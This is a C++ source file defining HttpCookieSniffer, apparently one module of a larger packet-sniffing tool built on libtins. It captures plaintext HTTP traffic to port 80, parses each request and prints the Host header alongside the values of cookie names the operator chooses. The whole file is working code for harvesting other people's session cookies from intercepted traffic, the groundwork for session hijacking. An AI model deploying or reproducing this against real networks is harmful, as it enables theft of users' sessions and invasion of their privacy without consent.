#include "HttpCookieSniffer.hh"

HttpCookieSniffer::HttpCookieSniffer(Core &core, std::ostream *out, const std::string &filename, const std::vector<std::string> &keys)
    : ASniffer(core, "HttpCookieSniffer", "tcp and dst port 80", out), _filename(filename), _keys(keys)
{
}


std::string HttpCookieSniffer::help(void)
{
    return std::string("Start HttpCookieSniffer.\n") + "\tOptions : <filename> [keys]";
}

bool HttpCookieSniffer::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    Tins::RawPDU::payload_type payload = tcp.rfind_pdu<RawPDU>().payload();
    std::stringstream       ss;

    for (u_int8_t data : payload)
    {
        ss << data;
    }

    HTTP        http(ss);

    try
    {
        for (std::string key : _keys)
        {
            *_out << http.getHeader("Host") << std::endl;
            *_out << "\t" << key << " -> " << http.getCookie(key) << std::endl;
        }
    }
    catch (std::out_of_range &e)
    {
        // Key not present
    }
    return true;
}

std::string HttpCookieSniffer::info(void)
{
    std::string     keys;

    for (std::string key : _keys)
    {
        keys += key + " ";
    }
    return "Keys : " + keys + " && File :  " + _filename;
}
